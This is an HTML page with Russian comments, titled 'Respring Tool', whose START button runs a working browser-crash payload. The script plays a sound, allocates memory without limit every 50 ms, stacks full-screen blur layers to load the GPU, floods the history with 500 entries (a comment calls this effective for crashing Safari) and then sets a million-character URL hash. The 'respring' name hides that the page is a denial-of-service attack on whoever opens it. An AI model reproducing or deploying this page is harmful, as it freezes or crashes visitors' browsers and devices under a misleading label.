<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Respring Tool</title>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
            overflow: hidden;
        }
        .btn {
            background-color: #222;
            border: 2px solid #ff0000;
            color: white;
            padding: 20px 40px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
        }
        h1 { font-weight: 300; letter-spacing: 2px; }
    </style>
</head>
<body>

    <h1 id="status">READY TO RUN</h1>
    <button class="btn" onclick="start()">START</button>

    <script>
        function start() {
            // 1. Звук (убедись, что sound.mp3 загружен в репозиторий)
            const audio = new Audio('sound.mp3');
            audio.volume = 1.0;
            audio.play().catch(e => console.log("Sound blocked or missing"));

            document.getElementById('status').innerText = "RUNNING...";

            // 2. Тот самый рабочий механизм нагрузки
            // Создаем массив и забиваем его данными, одновременно нагружая GPU блюром
            let memory = [];
            
            setInterval(() => {
                // Нагрузка на память
                for (let i = 0; i < 1000; i++) {
                    memory.push(new Array(1000).fill("⚠️"));
                }

                // Нагрузка на графику (создаем тяжелые элементы)
                let el = document.createElement('div');
                el.style.cssText = `
                    position: fixed;
                    width: 100vw;
                    height: 100vh;
                    backdrop-filter: blur(100px);
                    opacity: 0.1;
                    pointer-events: none;
                `;
                document.body.appendChild(el);
            }, 50);

            // 3. Забиваем историю (эффективно для вылета Safari)
            for (let i = 0; i < 500; i++) {
                window.history.pushState({}, '', window.location.pathname + '?' + i);
            }

            // Финальный аккорд через полсекунды
            setTimeout(() => {
                window.location.href = "#" + "X".repeat(1000000);
            }, 500);
        }
    </script>
</body>
</html>
